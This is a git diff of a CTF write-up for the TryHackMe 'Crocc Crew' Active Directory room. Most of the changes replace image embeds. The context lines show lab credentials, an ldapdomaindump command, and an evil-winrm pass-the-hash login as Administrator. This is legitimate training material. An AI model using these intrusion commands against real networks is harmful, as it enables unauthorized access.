@@ -1,9 +1,10 @@
 
-![[Pasted image 20250604145512.png]]
+![image](https://github.com/user-attachments/assets/d3044652-e9e7-42c1-b501-d0f340318432)
 
+```
 Room Link : https://tryhackme.com/room/crocccrew
 Difficulty : Insane 
-
+```
 ---
 ##### Initial scan
 
@@ -219,7 +220,8 @@ If you do not trust the certificate the connection atempt will be aborted:
 
 After connecting we got some credentials in the lockscreen wallpaper :
 
-![[Pasted image 20250604165158.png]]
+![image](https://github.com/user-attachments/assets/3ef6f419-0832-4117-a069-4f2f9c5c6ac2)
+
 
 Credentials :
 
@@ -296,7 +298,8 @@ Now that we got domain details lets try to enumerate more using ldapdomaindump
 ldapdomaindump 10.10.175.192 -u "COOCTUS\Visitor" -p 'GuestLogin!'
 ```
 
-![[Pasted image 20250606234008.png]]
+![image](https://github.com/user-attachments/assets/6ea8b168-4685-4de3-99fb-e8a3fc4608b0)
+
 
 Seems that the password-reset account has the flag 'TRUSTED_TO_AUTH_FOR_DELEGATION!' set which confirms our contrained delegation theory.
 
@@ -545,7 +548,8 @@ command :
 evil-winrm -i 10.10.96.32 -u Administrator -H 'add41095f1fb0405b32f70a489de022d'
 ```
 
-![[Pasted image 20250606235841.png]]
+![image](https://github.com/user-attachments/assets/94b84a58-678e-4c92-b850-a57771c8f8c5)
+
 
 We got the access into Administrator
 
@@ -557,7 +561,8 @@ We are using `Get-childitem` for recursive searching for the flag
 Get-Childitem -Path C:\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-![[Pasted image 20250607000125.png]]
+![image](https://github.com/user-attachments/assets/7a2baf9c-47bc-4673-8b02-f72b95cfad50)
+
 
 Here we got 3 flags in one location :
 
